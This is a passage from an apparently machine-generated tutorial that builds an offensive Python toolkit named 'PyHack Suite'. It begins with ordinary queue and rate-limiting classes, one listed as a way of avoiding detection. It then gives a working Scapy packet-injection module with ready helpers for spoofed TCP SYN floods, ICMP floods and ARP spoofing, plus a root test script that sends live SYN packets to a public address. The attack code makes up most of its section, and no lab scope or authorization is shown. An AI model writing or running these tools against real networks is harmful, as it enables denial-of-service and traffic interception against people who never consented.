            self.stats.current_size = len(self._queue)
            self.stats.total_wait_time += time.time() - timestamp
            self.stats.update()
            
            # Notify producers
            if self.maxsize > 0:
                self._not_full.notify()
            
            return item
    
    def get_nowait(self) -> Any:
        """
        Get an item from the queue without blocking.
        
        Returns:
            Any: The item
            
        Raises:
            queue.Empty: If queue is empty
        """
        if len(self._queue) == 0:
            raise queue.Empty()
        
        priority, timestamp, item = heapq.heappop(self._queue)
        
        self.stats.total_dequeued += 1
        self.stats.current_size = len(self._queue)
        self.stats.total_wait_time += time.time() - timestamp
        self.stats.update()
        
        return item
    
    def qsize(self) -> int:
        """Get the current queue size."""
        return len(self._queue)
    
    def empty(self) -> bool:
        """Check if the queue is empty."""
        return len(self._queue) == 0
    
    def clear(self):
        """Clear the queue."""
        self._queue.clear()
        self.stats.current_size = 0


class RingBufferQueue:
    """
    High-performance ring buffer for packet storage.
    
    A ring buffer is a fixed-size circular buffer. It's extremely
    efficient because:
    - No memory allocation during operations
    - O(1) enqueue and dequeue
    - Predictable performance
    
    Trade-offs:
    - Fixed size (can't grow)
    - Oldest items are overwritten
    - Not safe for multiple producers/consumers (use with locks)
    """
    
    def __init__(self, capacity: int = 1024):
        """
        Initialize the ring buffer.
        
        Args:
            capacity: Maximum number of items
        """
        self.capacity = capacity
        self._buffer = [None] * capacity
        self._head = 0  # Next write position
        self._tail = 0  # Next read position
        self._count = 0  # Current number of items
        
        self._lock = threading.Lock()
        self.stats = QueueStats()
        self.logger = get_logger(f"{__name__}.RingBufferQueue")
        
        self.logger.info(f"Ring buffer initialized with capacity: {capacity}")
    
    def put(self, item: Any, overwrite: bool = True) -> bool:
        """
        Put an item into the buffer.
        
        Args:
            item: Item to store
            overwrite: If full, overwrite oldest item
            
        Returns:
            bool: True if item was stored
        """
        with self._lock:
            if self._count == self.capacity:
                if not overwrite:
                    self.stats.total_dropped += 1
                    return False
                # Overwrite oldest item
                self._buffer[self._head] = item
                self._head = (self._head + 1) % self.capacity
                self._tail = (self._tail + 1) % self.capacity
                return True
            
            # Add item
            self._buffer[self._head] = item
            self._head = (self._head + 1) % self.capacity
            self._count += 1
            
            self.stats.total_enqueued += 1
            if self._count > self.stats.max_size:
                self.stats.max_size = self._count
            self.stats.current_size = self._count
            self.stats.update()
            
            return True
    
    def get(self) -> Optional[Any]:
        """
        Get an item from the buffer.
        
        Returns:
            Optional[Any]: The item, or None if empty
        """
        with self._lock:
            if self._count == 0:
                return None
            
            item = self._buffer[self._tail]
            self._buffer[self._tail] = None
            self._tail = (self._tail + 1) % self.capacity
            self._count -= 1
            
            self.stats.total_dequeued += 1
            self.stats.current_size = self._count
            self.stats.update()
            
            return item
    
    def get_all(self, max_count: Optional[int] = None) -> List[Any]:
        """
        Get multiple items from the buffer.
        
        Args:
            max_count: Maximum items to retrieve
            
        Returns:
            List[Any]: Retrieved items
        """
        items = []
        count = max_count or self._count
        
        for _ in range(count):
            item = self.get()
            if item is None:
                break
            items.append(item)
        
        return items
    
    def peek(self, index: int = 0) -> Optional[Any]:
        """
        Peek at an item without removing it.
        
        Args:
            index: Offset from the tail
            
        Returns:
            Optional[Any]: The item, or None if out of range
        """
        with self._lock:
            if index >= self._count:
                return None
            pos = (self._tail + index) % self.capacity
            return self._buffer[pos]
    
    def clear(self):
        """Clear the buffer."""
        with self._lock:
            self._buffer = [None] * self.capacity
            self._head = 0
            self._tail = 0
            self._count = 0
            self.stats.current_size = 0
    
    def qsize(self) -> int:
        """Get the current size."""
        return self._count
    
    def is_full(self) -> bool:
        """Check if the buffer is full."""
        return self._count == self.capacity


class BackpressureManager:
    """
    Manages backpressure for packet processing pipelines.
    
    Backpressure is a flow control mechanism where upstream components
    slow down when downstream components are overwhelmed.
    
    This prevents memory exhaustion and maintains system stability.
    
    Example:
        manager = BackpressureManager()
        manager.register_consumer("processor", max_buffer=1000)
        
        # In producer
        if manager.should_drop("processor"):
            drop_packet()
        else:
            process_packet()
    """
    
    def __init__(self):
        """Initialize the backpressure manager."""
        self._consumers: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()
        self.logger = get_logger(__name__)
    
    def register_consumer(
        self,
        name: str,
        max_buffer: int,
        min_threshold: float = 0.7,
        max_threshold: float = 0.9,
    ):
        """
        Register a consumer for backpressure management.
        
        Args:
            name: Consumer name
            max_buffer: Maximum buffer size
            min_threshold: Minimum threshold (0.0-1.0) to start pressure
            max_threshold: Maximum threshold (0.0-1.0) to force dropping
        """
        with self._lock:
            self._consumers[name] = {
                'max_buffer': max_buffer,
                'min_threshold': min_threshold,
                'max_threshold': max_threshold,
                'current_buffer': 0,
                'pressure': 0.0,  # 0.0 = no pressure, 1.0 = full pressure
                'dropped': 0,
                'total': 0,
            }
        self.logger.info(f"Registered consumer: {name}")
    
    def update_buffer(self, name: str, current_size: int):
        """
        Update a consumer's buffer size.
        
        Args:
            name: Consumer name
            current_size: Current buffer size
        """
        with self._lock:
            if name not in self._consumers:
                return
            
            consumer = self._consumers[name]
            consumer['current_buffer'] = current_size
            
            # Calculate pressure
            max_buffer = consumer['max_buffer']
            if max_buffer > 0:
                ratio = current_size / max_buffer
                min_th = consumer['min_threshold']
                max_th = consumer['max_threshold']
                
                if ratio < min_th:
                    pressure = 0.0
                elif ratio > max_th:
                    pressure = 1.0
                else:
                    # Linear interpolation between thresholds
                    pressure = (ratio - min_th) / (max_th - min_th)
                
                consumer['pressure'] = pressure
            else:
                consumer['pressure'] = 0.0
    
    def should_drop(self, name: str) -> bool:
        """
        Check if packets should be dropped for this consumer.
        
        Args:
            name: Consumer name
            
        Returns:
            bool: True if packets should be dropped
        """
        with self._lock:
            if name not in self._consumers:
                return False
            
            consumer = self._consumers[name]
            consumer['total'] += 1
            
            # Drop if pressure is high
            if consumer['pressure'] >= 1.0:
                consumer['dropped'] += 1
                return True
            
            return False
    
    def get_pressure(self, name: str) -> float:
        """
        Get the current backpressure level.
        
        Args:
            name: Consumer name
            
        Returns:
            float: Pressure level (0.0 = none, 1.0 = full)
        """
        with self._lock:
            if name not in self._consumers:
                return 0.0
            return self._consumers[name]['pressure']
    
    def get_stats(self, name: str) -> Optional[Dict[str, Any]]:
        """
        Get backpressure statistics for a consumer.
        
        Args:
            name: Consumer name
            
        Returns:
            Optional[Dict[str, Any]]: Statistics
        """
        with self._lock:
            if name not in self._consumers:
                return None
            
            consumer = self._consumers[name]
            total = consumer['total']
            dropped = consumer['dropped']
            
            return {
                'name': name,
                'current_buffer': consumer['current_buffer'],
                'max_buffer': consumer['max_buffer'],
                'pressure': consumer['pressure'],
                'total_items': total,
                'dropped_items': dropped,
                'drop_rate': dropped / total if total > 0 else 0,
            }
    
    def get_all_stats(self) -> Dict[str, Dict[str, Any]]:
        """
        Get statistics for all consumers.
        
        Returns:
            Dict[str, Dict[str, Any]]: All statistics
        """
        stats = {}
        for name in self._consumers:
            stats[name] = self.get_stats(name)
        return stats


class ThrottledQueue:
    """
    Queue with rate limiting.
    
    This limits the rate at which items are processed, useful for:
    - Rate limiting API calls
    - Avoiding network congestion
    - Throttling for compliance
    - Preventing detection
    """
    
    def __init__(self, max_rate: float, per_second: bool = True):
        """
        Initialize the throttled queue.
        
        Args:
            max_rate: Maximum rate
            per_second: If True, rate is per second; else per minute
        """
        self.max_rate = max_rate
        self.per_second = per_second
        self._queue = queue.Queue()
        self._last_processed = time.time()
        self._processed_count = 0
        self._lock = threading.Lock()
        
        self.stats = QueueStats()
        self.logger = get_logger(__name__)
    
    def put(self, item: Any):
        """Put an item into the queue."""
        self._queue.put(item)
        self.stats.total_enqueued += 1
    
    def get(self, timeout: Optional[float] = None) -> Optional[Any]:
        """
        Get an item from the queue, respecting the rate limit.
        
        Args:
            timeout: Maximum time to wait
            
        Returns:
            Optional[Any]: The item, or None if timed out
        """
        start_time = time.time()
        
        while True:
            # Check rate limit
            with self._lock:
                now = time.time()
                time_delta = now - self._last_processed
                
                if self.per_second:
                    rate_window = 1.0
                else:
                    rate_window = 60.0
                
                if time_delta >= rate_window:
                    # Reset counter
                    self._processed_count = 0
                    self._last_processed = now
                elif self._processed_count >= self.max_rate:
                    # Rate limit reached, wait
                    wait_time = rate_window - time_delta
                    if timeout is not None:
                        wait_time = min(wait_time, timeout)
                    if wait_time > 0:
                        time.sleep(wait_time)
                        continue
                    else:
                        return None
            
            # Try to get item
            try:
                if timeout is None:
                    item = self._queue.get(timeout=1.0)
                else:
                    remaining = timeout - (time.time() - start_time)
                    if remaining <= 0:
                        return None
                    item = self._queue.get(timeout=min(remaining, 1.0))
                
                # Update stats
                with self._lock:
                    self._processed_count += 1
                    self.stats.total_dequeued += 1
                
                return item
                
            except queue.Empty:
                if timeout is not None:
                    remaining = timeout - (time.time() - start_time)
                    if remaining <= 0:
                        return None
                    continue
                else:
                    continue
    
    def qsize(self) -> int:
        """Get the queue size."""
        return self._queue.qsize()
    
    def clear(self):
        """Clear the queue."""
        while not self._queue.empty():
            try:
                self._queue.get_nowait()
            except queue.Empty:
                break
        self.stats.current_size = 0
```

### The Verification

Test the queue management:

```bash
cat > test_queue_manager.py << 'EOF'
#!/usr/bin/env python3
"""Test script for queue management."""

import sys
import asyncio
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from pyhack_suite.network.queue_manager import (
    AsyncPriorityQueue,
    RingBufferQueue,
    BackpressureManager,
    ThrottledQueue,
)

async def test_priority_queue():
    """Test priority queue."""
    print("\n1. Testing Priority Queue...")
    pq = AsyncPriorityQueue(maxsize=5)
    
    # Add items with different priorities
    await pq.put("low", priority=10)
    await pq.put("high", priority=0)
    await pq.put("medium", priority=5)
    await pq.put("critical", priority=-1)
    
    # Get items (should be in priority order)
    items = []
    while not pq.empty():
        item = await pq.get()
        items.append(item)
    
    print(f"  Items in priority order: {items}")
    print(f"  Stats: {pq.stats.to_dict()}")

def test_ring_buffer():
    """Test ring buffer."""
    print("\n2. Testing Ring Buffer...")
    rb = RingBufferQueue(capacity=5)
    
    # Add items
    for i in range(7):
        rb.put(f"Item {i}")
    
    print(f"  Buffer size: {rb.qsize()}")
    print(f"  Items: {rb.get_all()}")
    print(f"  Stats: {rb.stats.to_dict()}")

def test_backpressure():
    """Test backpressure manager."""
    print("\n3. Testing Backpressure Manager...")
    bpm = BackpressureManager()
    
    # Register consumer
    bpm.register_consumer("processor", max_buffer=100, min_threshold=0.5, max_threshold=0.8)
    
    # Simulate buffer filling
    for i in range(0, 120, 10):
        bpm.update_buffer("processor", i)
        pressure = bpm.get_pressure("processor")
        should_drop = bpm.should_drop("processor")
        print(f"  Buffer: {i}, Pressure: {pressure:.2f}, Drop: {should_drop}")
    
    # Get stats
    stats = bpm.get_stats("processor")
    print(f"  Stats: {stats}")

def test_throttled_queue():
    """Test throttled queue."""
    print("\n4. Testing Throttled Queue...")
    tq = ThrottledQueue(max_rate=5, per_second=True)
    
    # Add items
    for i in range(20):
        tq.put(f"Item {i}")
    
    print(f"  Queue size: {tq.qsize()}")
    
    # Get items with rate limiting
    start = time.time()
    count = 0
    while True:
        item = tq.get(timeout=1.0)
        if item is None:
            break
        count += 1
        print(f"  Got: {item} (rate: {count/time.time():.2f}/s)")
        if count >= 10:
            break
    
    elapsed = time.time() - start
    print(f"  Retrieved {count} items in {elapsed:.2f}s")

async def main():
    """Run all tests."""
    print("=" * 60)
    print("Testing Queue Management")
    print("=" * 60)
    
    await test_priority_queue()
    test_ring_buffer()
    test_backpressure()
    test_throttled_queue()
    
    print("\nQueue management test complete!")
    return 0

if __name__ == "__main__":
    asyncio.run(main())
EOF

python test_queue_manager.py
```

---

```
[COMPLETED: Part 2, Section 3 - Queue Management]
[GENERATING: Part 2, Section 4 - Event-Driven Packet Injection]
```

## Section 4: Event-Driven Packet Injection

### The Target
`pyhack_suite/network/packet_injection.py` - Event-driven packet injection with timing and triggers

### The Concept
Packet injection is like being a sniper - you need to send packets at exactly the right moment with precision timing. Event-driven injection combines:
1. **Sniffing** - Watching for specific triggers (like a TCP SYN)
2. **Injection** - Sending a packet in response (like a SYN-ACK)
3. **Timing** - Sending at the right time to be effective

This is used for:
- **Protocol fuzzing** - Sending malformed packets based on triggers
- **Active reconnaissance** - Responding to network conditions
- **Exploitation** - Timing attacks precisely

---

## Step 2.4: Packet Injection System

### The Implementation

Create `pyhack_suite/network/packet_injection.py`:

```python
#!/usr/bin/env python3
"""
Event-driven packet injection for PyHack Suite.

This module provides:
- Timed packet injection (send at specific times)
- Trigger-based injection (send on matching packets)
- Sequence injection (send a sequence of packets)
- Fuzzing injection (send malformed packets)

Architecture decisions:
- Use asyncio for timing precision
- Integration with AsyncSniffer for triggers
- Thread-safe injection scheduling
- Support for complex injection patterns

Use cases:
- TCP SYN flooding with timing randomization
- ICMP redirect attacks
- DNS spoofing with real-time triggers
- Custom protocol testing
"""

import asyncio
import time
import random
import threading
from typing import Optional, Dict, Any, List, Callable, Union, Tuple
from dataclasses import dataclass, field
import struct

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, Ether, ARP, DNS, send, sendp,
        conf, Packet, Raw, sr1, srp
    )
except ImportError:
    raise ImportError("Scapy not installed. Run: pip install scapy")

from pyhack_suite.core.event_loop import get_event_loop
from pyhack_suite.core.config import get_config
from pyhack_suite.network.async_sniffer import AsyncPacketSniffer
from pyhack_suite.network.scapy_wrapper import ScapyWrapper
from pyhack_suite.utils.logging import get_logger, log_function_call

logger = get_logger(__name__)


@dataclass
class InjectionConfig:
    """Configuration for packet injection."""
    
    # Timing
    delay: float = 0.0  # Initial delay
    interval: float = 0.1  # Between packets
    jitter: float = 0.0  # Random jitter (±)
    
    # Count
    count: int = 1  # Number of packets to send
    infinite: bool = False  # Send indefinitely
    
    # Triggering
    trigger: Optional[str] = None  # BPF filter for trigger
    trigger_count: int = 1  # Number of triggers before sending
    
    # Rate limiting
    rate_limit: Optional[float] = None  # Packets per second
    
    # Options
    verbose: bool = False
    randomize: bool = False  # Randomize packet fields
    
    def __post_init__(self):
        """Validate configuration."""
        if self.delay < 0:
            raise ValueError("Delay must be >= 0")
        if self.interval < 0:
            raise ValueError("Interval must be >= 0")
        if self.jitter < 0:
            raise ValueError("Jitter must be >= 0")
        if self.rate_limit is not None and self.rate_limit <= 0:
            raise ValueError("Rate limit must be > 0")


class PacketInjector:
    """
    Packet injector with timing and trigger control.
    
    This provides high-level injection capabilities:
    - Scheduled injection at specific times
    - Trigger-based injection from packet sniffing
    - Randomized timing for evasion
    - Rate limiting for controlled attacks
    
    Example:
        injector = PacketInjector(interface="eth0")
        
        # Send a TCP SYN packet every 100ms
        packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
        config = InjectionConfig(interval=0.1, count=100)
        injector.schedule_injection(packet, config)
        
        # Send in response to ARP requests
        def create_response(packet):
            return ARP(op=2, psrc="192.168.1.1", pdst=packet[ARP].psrc)
        
        injector.start_trigger_injection(
            trigger_filter="arp and arp[7] == 1",
            response_builder=create_response,
            config=InjectionConfig(count=10)
        )
    """
    
    def __init__(self, interface: Optional[str] = None):
        """
        Initialize the packet injector.
        
        Args:
            interface: Network interface
        """
        self.config = get_config()
        self.interface = interface or self.config.network.scapy_interface
        
        self.logger = get_logger(f"{__name__}.PacketInjector.{self.interface}")
        self.event_loop = get_event_loop()
        
        # Injection tracking
        self._injections: Dict[str, Dict[str, Any]] = {}
        self._injection_counter = 0
        self._lock = threading.Lock()
        
        # Statistics
        self.stats = {
            'total_sent': 0,
            'total_failed': 0,
            'total_triggers': 0,
            'active_injections': 0,
        }
        
        # Background sniffer for triggers
        self._sniffer: Optional[AsyncPacketSniffer] = None
        self._trigger_tasks: Dict[str, asyncio.Task] = {}
        
        # Scapy wrapper for sending
        self._wrapper = ScapyWrapper(interface=self.interface)
        
        # Configure Scapy
        conf.use_pcap = True
        conf.verb = 0
        
        self.logger.info(f"Packet injector initialized on {self.interface}")
    
    @log_function_call(level="INFO")
    def schedule_injection(
        self,
        packet: Packet,
        config: Optional[InjectionConfig] = None,
        name: Optional[str] = None,
    ) -> str:
        """
        Schedule a packet injection.
        
        Args:
            packet: Base packet to send (can be modified per send)
            config: Injection configuration
            name: Optional name for this injection
            
        Returns:
            str: Injection ID
        """
        config = config or InjectionConfig()
        injection_id = f"inject_{self._injection_counter}_{int(time.time())}"
        self._injection_counter += 1
        
        # Create injection task
        task = self.event_loop.schedule_task(
            self._injection_loop(injection_id, packet, config)
        )
        
        with self._lock:
            self._injections[injection_id] = {
                'id': injection_id,
                'name': name or injection_id,
                'packet': packet,
                'config': config,
                'task': task,
                'created_at': time.time(),
                'status': 'scheduled',
            }
            self.stats['active_injections'] += 1
        
        self.logger.info(f"Scheduled injection: {injection_id}")
        return injection_id
    
    async def _injection_loop(
        self,
        injection_id: str,
        base_packet: Packet,
        config: InjectionConfig
    ):
        """
        Async injection loop.
        
        Args:
            injection_id: Injection identifier
            base_packet: Base packet to send
            config: Injection configuration
        """
        try:
            # Initial delay
            if config.delay > 0:
                self.logger.debug(f"Waiting {config.delay}s before sending")
                await asyncio.sleep(config.delay)
            
            # Prepare for sending
            count = 0
            start_time = time.time()
            last_send = start_time
            
            # Rate limiting interval
            rate_interval = 1.0 / config.rate_limit if config.rate_limit else 0
            
            while config.infinite or count < config.count:
                # Check if we should stop
                if not self.event_loop.running:
                    break
                
                # Rate limiting
                if rate_interval > 0:
                    elapsed = time.time() - last_send
                    if elapsed < rate_interval:
                        await asyncio.sleep(rate_interval - elapsed)
                
                # Build packet (with randomization if enabled)
                packet = self._build_packet(base_packet, config.randomize)
                
                # Send packet
                try:
                    if self._wrapper:
                        send(packet, verbose=config.verbose, iface=self.interface)
                    else:
                        send(packet, verbose=config.verbose, iface=self.interface)
                    
                    with self._lock:
                        self.stats['total_sent'] += 1
                    
                    self.logger.debug(f"Sent packet {count + 1}: {packet.summary()}")
                    
                except Exception as e:
                    self.logger.error(f"Failed to send packet: {e}")
                    with self._lock:
                        self.stats['total_failed'] += 1
                
                count += 1
                
                # Add jitter to interval
                if config.jitter > 0:
                    jitter = random.uniform(-config.jitter, config.jitter)
                else:
                    jitter = 0
                
                # Wait for next interval
                if config.infinite or count < config.count:
                    wait_time = max(0, config.interval + jitter)
                    if wait_time > 0:
                        await asyncio.sleep(wait_time)
            
            # Update status
            with self._lock:
                self._injections[injection_id]['status'] = 'completed'
                self.stats['active_injections'] -= 1
            
            self.logger.info(f"Injection completed: {injection_id} ({count} packets)")
            
        except asyncio.CancelledError:
            with self._lock:
                self._injections[injection_id]['status'] = 'cancelled'
                self.stats['active_injections'] -= 1
            self.logger.info(f"Injection cancelled: {injection_id}")
            raise
        except Exception as e:
            self.logger.error(f"Injection failed: {e}")
            with self._lock:
                self._injections[injection_id]['status'] = 'failed'
                self.stats['active_injections'] -= 1
    
    def _build_packet(self, base_packet: Packet, randomize: bool) -> Packet:
        """
        Build a packet, optionally randomizing fields.
        
        Args:
            base_packet: Base packet
            randomize: Whether to randomize fields
            
        Returns:
            Packet: Built packet
        """
        if not randomize:
            return base_packet
        
        # Create a copy
        packet = base_packet.copy()
        
        # Randomize fields
        if packet.haslayer(IP):
            # Randomize TTL
            packet[IP].ttl = random.randint(32, 255)
            # Randomize ToS
            packet[IP].tos = random.randint(0, 0xFF)
        
        if packet.haslayer(TCP):
            # Randomize sequence number
            packet[TCP].seq = random.randint(0, 0xFFFFFFFF)
            # Randomize window
            packet[TCP].window = random.randint(1024, 65535)
        
        if packet.haslayer(UDP):
            # Randomize source port if not specified
            if packet[UDP].sport == 0:
                packet[UDP].sport = random.randint(1024, 65535)
        
        return packet
    
    @log_function_call(level="INFO")
    async def start_trigger_injection(
        self,
        trigger_filter: str,
        response_builder: Callable[[Packet], Packet],
        config: Optional[InjectionConfig] = None,
        name: Optional[str] = None,
    ) -> str:
        """
        Start trigger-based injection.
        
        This sniffs for packets matching the filter and sends a response.
        
        Args:
            trigger_filter: BPF filter to trigger on
            response_builder: Function that takes trigger packet and returns response
            config: Injection configuration
            name: Optional name
            
        Returns:
            str: Trigger ID
        """
        config = config or InjectionConfig()
        trigger_id = f"trigger_{self._injection_counter}_{int(time.time())}"
        self._injection_counter += 1
        
        # Start sniffer
        if not self._sniffer:
            self._sniffer = AsyncPacketSniffer(
                interface=self.interface,
                filter_str=trigger_filter,
                buffer_size=100
            )
            await self._sniffer.start()
        
        # Track trigger count
        trigger_count = 0
        sent_count = 0
        
        def on_trigger(packet):
            """Handle trigger packet."""
            nonlocal trigger_count, sent_count
            
            trigger_count += 1
            with self._lock:
                self.stats['total_triggers'] += 1
            
            # Check if we should send
            if trigger_count % config.trigger_count != 0:
                return
            
            # Build response
            try:
                response = response_builder(packet)
                if response is None:
                    return
                
                # Schedule injection
                send(response, verbose=config.verbose, iface=self.interface)
                
                sent_count += 1
                with self._lock:
                    self.stats['total_sent'] += 1
                
                self.logger.debug(f"Trigger response sent: {response.summary()}")
                
            except Exception as e:
                self.logger.error(f"Trigger response failed: {e}")
                with self._lock:
                    self.stats['total_failed'] += 1
        
        # Register callback
        self._sniffer.add_callback(on_trigger)
        
        # Store trigger info
        with self._lock:
            self._trigger_tasks[trigger_id] = {
                'id': trigger_id,
                'name': name or trigger_id,
                'filter': trigger_filter,
                'config': config,
                'started_at': time.time(),
                'status': 'running',
            }
        
        self.logger.info(f"Started trigger injection: {trigger_id}")
        return trigger_id
    
    async def stop_trigger_injection(self, trigger_id: str):
        """
        Stop a trigger-based injection.
        
        Args:
            trigger_id: Trigger ID to stop
        """
        with self._lock:
            if trigger_id not in self._trigger_tasks:
                self.logger.warning(f"Trigger not found: {trigger_id}")
                return
            
            self._trigger_tasks[trigger_id]['status'] = 'stopped'
            del self._trigger_tasks[trigger_id]
        
        # Stop sniffer if no more triggers
        if not self._trigger_tasks and self._sniffer:
            await self._sniffer.stop()
            self._sniffer = None
        
        self.logger.info(f"Stopped trigger injection: {trigger_id}")
    
    async def stop_all(self):
        """Stop all injections and triggers."""
        # Cancel scheduled injections
        with self._lock:
            for injection_id, info in list(self._injections.items()):
                if info['task'] and not info['task'].done():
                    info['task'].cancel()
            self._injections.clear()
        
        # Stop triggers
        for trigger_id in list(self._trigger_tasks.keys()):
            await self.stop_trigger_injection(trigger_id)
        
        # Stop sniffer
        if self._sniffer:
            await self._sniffer.stop()
            self._sniffer = None
        
        self.logger.info("All injections stopped")
    
    def get_status(self, injection_id: Optional[str] = None) -> Dict[str, Any]:
        """
        Get injection status.
        
        Args:
            injection_id: Specific injection ID (None for all)
            
        Returns:
            Dict[str, Any]: Status information
        """
        if injection_id:
            with self._lock:
                if injection_id not in self._injections:
                    return {'error': 'Injection not found'}
                return self._injections[injection_id]
        
        # Get all statuses
        statuses = {
            'injections': {},
            'triggers': {},
            'stats': self.stats.copy(),
        }
        
        with self._lock:
            for inj_id, info in self._injections.items():
                statuses['injections'][inj_id] = {
                    'name': info['name'],
                    'status': info['status'],
                    'created_at': info['created_at'],
                }
            
            for trig_id, info in self._trigger_tasks.items():
                statuses['triggers'][trig_id] = {
                    'name': info['name'],
                    'filter': info['filter'],
                    'status': info['status'],
                    'started_at': info['started_at'],
                }
        
        return statuses
    
    def cancel_injection(self, injection_id: str):
        """
        Cancel a scheduled injection.
        
        Args:
            injection_id: Injection to cancel
        """
        with self._lock:
            if injection_id not in self._injections:
                self.logger.warning(f"Injection not found: {injection_id}")
                return
            
            task = self._injections[injection_id]['task']
            if task and not task.done():
                task.cancel()
                self._injections[injection_id]['status'] = 'cancelled'
                self.stats['active_injections'] -= 1
                self.logger.info(f"Cancelled injection: {injection_id}")
    
    def close(self):
        """Clean up resources."""
        # Cancel all injections
        for injection_id in list(self._injections.keys()):
            self.cancel_injection(injection_id)
        
        # Clear sniffer
        if self._sniffer:
            # Async cleanup is handled elsewhere
            pass
        
        self.logger.info("Packet injector closed")
    
    async def __aenter__(self):
        """Async context manager entry."""
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.stop_all()
        self.close()


# Convenience functions for common attacks

def create_tcp_syn_flood(
    target_ip: str,
    target_port: int,
    source_ip: Optional[str] = None,
    count: int = 1000,
    interval: float = 0.01,
) -> Tuple[Packet, InjectionConfig]:
    """
    Create a TCP SYN flood injection.
    
    Args:
        target_ip: Target IP
        target_port: Target port
        source_ip: Source IP (spoofing)
        count: Number of packets
        interval: Time between packets
        
    Returns:
        Tuple[Packet, InjectionConfig]: (base packet, config)
    """
    if source_ip:
        ip = IP(src=source_ip, dst=target_ip)
    else:
        ip = IP(dst=target_ip)
    
    tcp = TCP(
        sport=random.randint(1024, 65535),
        dport=target_port,
        flags='S',
        seq=random.randint(0, 0xFFFFFFFF),
    )
    
    packet = ip / tcp
    config = InjectionConfig(
        interval=interval,
        count=count,
        randomize=True,
        jitter=interval * 0.1,
    )
    
    return packet, config


def create_icmp_flood(
    target_ip: str,
    source_ip: Optional[str] = None,
    count: int = 1000,
    interval: float = 0.01,
) -> Tuple[Packet, InjectionConfig]:
    """
    Create an ICMP flood injection.
    
    Args:
        target_ip: Target IP
        source_ip: Source IP (spoofing)
        count: Number of packets
        interval: Time between packets
        
    Returns:
        Tuple[Packet, InjectionConfig]: (base packet, config)
    """
    if source_ip:
        ip = IP(src=source_ip, dst=target_ip)
    else:
        ip = IP(dst=target_ip)
    
    icmp = ICMP(type=8, code=0) / Raw(load=b'X' * 1024)  # Ping with payload
    
    packet = ip / icmp
    config = InjectionConfig(
        interval=interval,
        count=count,
        randomize=True,
        jitter=interval * 0.1,
    )
    
    return packet, config


def create_arp_spoof(
    target_ip: str,
    spoof_ip: str,
    target_mac: Optional[str] = None,
    count: int = 10,
    interval: float = 1.0,
) -> Tuple[Packet, InjectionConfig]:
    """
    Create an ARP spoofing injection.
    
    Args:
        target_ip: Target IP to poison
        spoof_ip: IP to spoof (gateway IP)
        target_mac: Target MAC (optional)
        count: Number of packets
        interval: Time between packets
        
    Returns:
        Tuple[Packet, InjectionConfig]: (base packet, config)
    """
    arp = ARP(
        op=2,  # Reply
        psrc=spoof_ip,
        pdst=target_ip,
        hwdst=target_mac or "ff:ff:ff:ff:ff:ff",
    )
    
    packet = Ether(dst=target_mac or "ff:ff:ff:ff:ff:ff") / arp
    config = InjectionConfig(
        interval=interval,
        count=count,
    )
    
    return packet, config
```

### The Verification

Test the packet injection system:

```bash
cat > test_injection.py << 'EOF'
#!/usr/bin/env python3
"""Test script for packet injection."""

import sys
import asyncio
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from pyhack_suite.network.packet_injection import (
    PacketInjector,
    InjectionConfig,
    create_tcp_syn_flood,
    create_icmp_flood,
    create_arp_spoof,
)

async def test_injection():
    """Test packet injection."""
    print("=" * 60)
    print("Testing Packet Injection")
    print("=" * 60)
    
    # Create injector
    print("\n1. Creating injector...")
    injector = PacketInjector(interface="eth0")
    print(f"  Interface: {injector.interface}")
    
    # Test scheduled injection
    print("\n2. Testing scheduled injection...")
    
    # Create a simple packet
    from scapy.all import IP, TCP
    
    packet = IP(dst="8.8.8.8") / TCP(dport=80, flags="S")
    config = InjectionConfig(
        delay=0.5,
        interval=0.2,
        count=5,
        jitter=0.05,
        verbose=False,
    )
    
    print(f"  Scheduling injection: {packet.summary()}")
    print(f"  Config: {config.count} packets, {config.interval}s interval")
    
    injection_id = injector.schedule_injection(packet, config)
    print(f"  Injection ID: {injection_id}")
    
    # Wait for completion
    print("  Waiting for injection to complete...")
    await asyncio.sleep(2)  # Let it run for a bit
    
    # Check status
    status = injector.get_status(injection_id)
    print(f"  Status: {status.get('status', 'unknown')}")
    
    # Test trigger injection
    print("\n3. Testing trigger injection...")
    
    async def trigger_test():
        # Create a simple response builder
        def build_response(trigger_packet):
            print(f"  Triggered by: {trigger_packet.summary()}")
            # Echo back with same packet
            return trigger_packet
        
        trigger_id = await injector.start_trigger_injection(
            trigger_filter="icmp and icmp[0] == 8",  # ICMP echo request
            response_builder=build_response,
            config=InjectionConfig(count=3),
        )
        print(f"  Trigger ID: {trigger_id}")
        
        # Let it run for a few seconds
        await asyncio.sleep(3)
        
        # Stop trigger
        await injector.stop_trigger_injection(trigger_id)
        print("  Trigger stopped")
    
    await trigger_test()
    
    # Test attack helpers
    print("\n4. Testing attack helpers...")
    
    # TCP SYN flood
    packet, config = create_tcp_syn_flood(
        target_ip="192.168.1.1",
        target_port=80,
        source_ip="10.0.0.1",
        count=3,
        interval=0.1,
    )
    print(f"  TCP SYN flood: {packet.summary()} ({config.count} packets)")
    
    # ICMP flood
    packet, config = create_icmp_flood(
        target_ip="192.168.1.1",
        source_ip="10.0.0.1",
        count=3,
    )
    print(f"  ICMP flood: {packet.summary()} ({config.count} packets)")
    
    # ARP spoof
    packet, config = create_arp_spoof(
        target_ip="192.168.1.100",
        spoof_ip="192.168.1.1",
        count=2,
    )
    print(f"  ARP spoof: {packet.summary()} ({config.count} packets)")
    
    # Get statistics
    print("\n5. Statistics:")
    stats = injector.get_status()
    print(f"  Total sent: {stats['stats']['total_sent']}")
    print(f"  Total triggers: {stats['stats']['total_triggers']}")
    print(f"  Active injections: {stats['stats']['active_injections']}")
    
    # Clean up
    print("\n6. Cleaning up...")
    await injector.stop_all()
    print("  All stopped")
    
    print("\nPacket injection test complete!")
    return 0

async def main():
    """Run the test."""
    try:
        await test_injection()
    except KeyboardInterrupt:
        print("\nTest interrupted by user")
    except Exception as e:
        print(f"\nTest failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
EOF

sudo python test_injection.py
```

---

```
[COMPLETED: Part 2, Section 4 - Event-Driven Packet Injection]
[COMPLETED: Part 2 - High-Speed Packet Sniffing & Asynchronous Integration]

[GENERATED: Part 2 Complete]
[STARTING: Part 3 - Stealth Reconnaissance & Asynchronous Tooling]
